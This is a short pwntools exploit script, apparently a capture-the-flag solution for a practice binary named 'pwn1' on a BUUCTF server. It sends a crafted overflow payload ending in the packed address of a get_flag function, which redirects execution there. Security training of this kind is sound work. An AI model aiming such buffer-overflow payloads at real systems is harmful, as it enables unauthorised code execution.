#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#  sh = process("./pwn1")
sh = remote("node3.buuoj.cn",28298) 

elf = ELF("./pwn1")

context.log_level = 'debug'

get_flag = elf.symbols["get_flag"]
log.info("get_flag -> " + hex(get_flag))

payload = 'I' * 21 + 'a' + p32(get_flag)

sh.sendline(payload)
log.info(sh.recv())

#  gdb.attach(sh)

sh.interactive()
